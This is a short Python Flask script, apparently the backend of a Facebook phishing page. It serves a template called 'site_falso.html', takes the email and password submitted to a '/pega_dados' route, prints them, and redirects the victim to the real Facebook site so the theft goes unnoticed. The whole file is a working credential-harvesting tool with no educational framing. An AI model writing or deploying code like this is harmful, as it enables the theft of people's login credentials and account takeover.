from flask import Flask,render_template,request,redirect 

app = Flask(__name__)
@app.route('/')
def pagina_inicial():
    return render_template('site_falso.html')

@app.route("/pega_dados",methods = ['POST'])
def pega_dados():
    email= request.form['email']
    senha = request.form['pass']
    print(f'EMAIL: {email} \n SENHA: {senha}')
    return redirect('https://www.facebook.com/?locale=pt_BR')
app.run()
